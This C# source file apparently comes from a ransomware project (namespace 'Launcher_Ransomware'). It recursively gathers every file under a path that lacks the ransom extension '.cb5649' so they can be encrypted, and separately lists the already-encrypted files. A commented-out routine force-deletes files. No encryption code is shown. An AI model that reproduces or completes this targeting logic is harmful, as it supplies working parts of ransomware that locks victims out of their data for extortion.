using System.Linq;

namespace Launcher_Ransomware
{
    public class FileMethod
    {
        private static List<string> currFiles = new();
        private static readonly List<string> totalFiles = new();
        private static readonly string encrypted_file_extension = ".cb5649";
        
        //public void GetAllFiles(string path)
        //{
        //    currFiles = Directory.EnumerateFiles(path).ToList();

        //    if (currFiles.Count == 0) goto NextFolder;

        //    foreach (string file in currFiles)
        //    {
        //        totalFiles.Add(file);
        //    }

        //    NextFolder:
        //    foreach (string folder in Directory.EnumerateDirectories(path))
        //    {
        //        GetAllFiles(folder);
        //    }
        //}

        /// <summary>
        /// Get all files that are neither encrypted nor decrypted
        /// </summary>
        /// <param name="path"></param>
        public void GetAllUncryptedFiles(string path)
        {
            currFiles = Directory.EnumerateFiles(path).ToList();

            if (currFiles.Count == 0) goto NextFolder;

            foreach (var file in currFiles)
            {
                if (!file.Contains(encrypted_file_extension))
                {
                    totalFiles.Add(file);
                }
            }

            NextFolder:
            foreach (var folder in Directory.EnumerateDirectories(path))
            {
                GetAllUncryptedFiles(folder);
            }
        }

        /// <summary>
        /// Get all files that are already encrypted
        /// </summary>
        /// <param name="path"></param>
        public void GetAllEncryptedFiles(string path)
        {
            currFiles = Directory.EnumerateFiles(path).ToList();

            if (currFiles.Count == 0) goto NextFolder;

            foreach (var file in currFiles)
            {
                if (file.Contains(encrypted_file_extension))
                {
                    totalFiles.Add(file);
                }
            }

            NextFolder:
            foreach (var folder in Directory.EnumerateDirectories(path))
            {
                GetAllEncryptedFiles(folder);
            }
        }

        //public void DeleteFile(string file)
        //{
        //    if (File.Exists(file))
        //    {
        //        File.SetAttributes(file, FileAttributes.Normal);
        //        File.Delete(file);
        //    }
        //}

        // Clear the file list for later processes

        public void ClearTotalFiles()
        {
            totalFiles.Clear();
        }

        // Return the list of total files for later processes
        public List<string> GetTotalFiles()
        {
            return totalFiles;
        }
    }
}
